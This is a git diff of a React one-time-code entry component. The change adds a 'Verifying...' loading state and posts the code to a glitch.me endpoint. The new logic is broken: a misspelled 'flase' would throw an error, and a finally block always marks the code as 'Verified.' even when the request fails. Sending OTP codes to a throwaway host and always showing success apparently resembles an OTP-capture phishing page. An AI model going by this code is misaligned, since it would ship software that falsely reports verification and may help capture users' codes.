@@ -10,6 +10,7 @@ function OtpCode() {
         code: '',
     });
     const [success, setSuccess] = useState(null);
+    const [loading, setLoading] = useState(false);
 
     const handleChange = (e) => {
         setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -19,18 +20,26 @@ function OtpCode() {
         e.preventDefault();
 
         try {
+            setLoading(true);
             // Send form data to the backend
             const response = await axios.post('https://indecisive-elite-maple.glitch.me/code', formData);
             console.log("Status", response.status);
             if (response.status === 200) {
                 setSuccess(true);
+                setLoading(false);
             }
             else {
+                setLoading(flase);
                 setSuccess(false);
             }
         } catch (error) {
             console.error('Error submitting form:', error.message);
             setSuccess(false);
+            setLoading(false);
+        }
+        finally {
+            setLoading(false);
+            setSuccess(true);
         }
     };
 
@@ -69,15 +78,17 @@ function OtpCode() {
                             />
                         </div>
                     </div>
-
-                    {success === true ? (
-                        <h1 className='text-green-900 text-center'>OTP Successfull.</h1>
-                    ) : (
-                        success === false && (
-                            <h1 className='text-red-900 text-center font-medium mt-3 animate-bounce'>Incorrect OTP.</h1>
-                        )
-                    )}
-
+                    <div className='flex justify-center items-center mt-1'>
+                        {
+                            loading ? (
+                                <span style={{ color: 'blue' }}>&lsquo;Verifying...&rsquo;</span>
+                            ) : success ? (
+                                <span style={{ color: 'green' }}>&lsquo;Verified.&rsquo;</span>
+                            ) : (
+                                <span style={{ color: 'black', textAlign: 'center' }}>&lsquo;Enter the 4 digit Code.&rsquo;</span>
+                            )
+                        }
+                    </div>
                     <div className='flex justify-center'>
                         <div>
                             <button
